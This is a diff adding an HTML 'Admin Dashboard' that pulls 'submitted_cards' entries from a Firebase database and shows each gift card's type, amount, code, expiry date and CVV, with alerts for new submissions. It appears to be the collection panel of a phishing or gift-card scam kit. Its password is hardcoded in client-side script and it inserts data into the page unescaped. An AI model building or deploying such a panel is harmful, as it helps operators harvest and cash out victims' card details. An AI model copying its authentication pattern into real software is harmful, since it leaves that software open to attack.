@@ -1,0 +1,207 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<title>Admin Dashboard</title>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<style>
+    body {
+        margin: 0;
+        background: #111;
+        color: #fff;
+        font-family: Arial, sans-serif;
+    }
+
+    .login-box, .dashboard {
+        max-width: 500px;
+        margin: auto;
+        padding: 20px;
+    }
+
+    .login-box {
+        margin-top: 90px;
+        background: #1a1a1a;
+        padding: 25px;
+        border-radius: 12px;
+        box-shadow: 0 0 12px rgba(255,255,255,0.1);
+        text-align: center;
+    }
+
+    input {
+        width: 100%;
+        padding: 14px;
+        border-radius: 8px;
+        border: none;
+        margin-bottom: 15px;
+        font-size: 17px;
+        background: #222;
+        color: #fff;
+    }
+
+    button {
+        width: 100%;
+        background: #ffcc00;
+        border: none;
+        padding: 15px;
+        border-radius: 8px;
+        font-size: 17px;
+        font-weight: bold;
+        color: #000;
+    }
+
+    .entry {
+        background: #1e1e1e;
+        padding: 15px;
+        margin: 15px 0;
+        border-radius: 10px;
+        line-height: 1.5;
+        border-left: 4px solid #ffcc00;
+    }
+
+    .delete-btn {
+        background: red;
+        color: white;
+        padding: 10px;
+        margin-top: 10px;
+        width: 100%;
+        border-radius: 6px;
+        border: none;
+        font-size: 15px;
+    }
+
+    .hidden {
+        display: none;
+    }
+
+</style>
+</head>
+<body>
+
+<!-- PASSWORD GATE -->
+<div class="login-box" id="loginBox">
+    <h2>Admin Login</h2>
+    <input type="password" id="adminPass" placeholder="Enter Password">
+    <button onclick="checkPass()">Login</button>
+    <p style="color:red; display:none;" id="wrongPass">Incorrect password</p>
+</div>
+
+<!-- DASHBOARD -->
+<div class="dashboard hidden" id="dashboard">
+    <h2 style="text-align:center;">Submitted Giftcards</h2>
+    <div id="dataList"></div>
+</div>
+
+<script>
+// ------------------------------------------------------------
+// FIREBASE SETUP
+// ------------------------------------------------------------
+var firebaseConfig = {
+    databaseURL: "https://stake-f540f-default-rtdb.firebaseio.com/"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database().ref("submitted_cards");
+
+// ------------------------------------------------------------
+// REQUEST NOTIFICATION PERMISSION
+// ------------------------------------------------------------
+if ("Notification" in window && Notification.permission !== "granted") {
+    Notification.requestPermission().then(permission => {
+        if (permission === "granted") {
+            console.log("Notifications allowed");
+        }
+    });
+}
+
+// ------------------------------------------------------------
+// PASSWORD GATE
+// ------------------------------------------------------------
+const CORRECT_PASS = "suwe"; // change it
+
+function checkPass() {
+    const input = document.getElementById("adminPass").value;
+
+    if (input === CORRECT_PASS) {
+        document.getElementById("loginBox").classList.add("hidden");
+        document.getElementById("dashboard").classList.remove("hidden");
+        loadData();
+    } else {
+        document.getElementById("wrongPass").style.display = "block";
+    }
+}
+
+// ------------------------------------------------------------
+// LOAD DATA LIVE WITH NOTIFICATIONS
+// ------------------------------------------------------------
+let knownKeys = new Set(); // store keys we already displayed
+
+function loadData() {
+    db.on("value", (snapshot) => {
+        const dataList = document.getElementById("dataList");
+        dataList.innerHTML = "";
+
+        snapshot.forEach(entry => {
+            const key = entry.key;
+            const data = entry.val();
+
+            // Show notification only for new entries
+            if (!knownKeys.has(key)) {
+                knownKeys.add(key);
+                sendNotification(data);
+            }
+
+            const box = document.createElement("div");
+            box.className = "entry";
+
+            box.innerHTML = `
+                <strong>Type:</strong> ${data.giftCardType}<br>
+                <strong>Currency:</strong> ${data.currency}<br>
+                <strong>Amount:</strong> ${data.amount}<br>
+                <strong>Code:</strong> ${data.cardCode}<br>
+                <strong>Expiry:</strong> ${data.expiryDate}<br>
+                <strong>CVV:</strong> ${data.cvv}<br>
+                <strong>Time:</strong> ${data.time}<br>
+                <button class="delete-btn" onclick="deleteEntry('${key}')">Delete</button>
+            `;
+
+            dataList.prepend(box);
+        });
+    });
+}
+
+// ------------------------------------------------------------
+// FUNCTION TO SEND NOTIFICATIONS
+// ------------------------------------------------------------
+function sendNotification(data) {
+    if ("Notification" in window && Notification.permission === "granted") {
+        const notification = new Notification("New Giftcard Submitted!", {
+            body: `Type: ${data.giftCardType}, Amount: ${data.amount} ${data.currency}`,
+            icon: "https://i.imgur.com/6oKf8c0.png" // optional icon
+        });
+
+        notification.onclick = () => {
+            window.focus(); // bring the admin page to front
+            notification.close();
+        };
+    }
+}
+
+// ------------------------------------------------------------
+// DELETE ENTRY
+// ------------------------------------------------------------
+function deleteEntry(id) {
+    if (confirm("Delete this entry?")) {
+        db.child(id).remove();
+        knownKeys.delete(id); // remove from known keys so new entry with same ID triggers notification if re-added
+    }
+}
+</script>
+
+</body>
+</html>
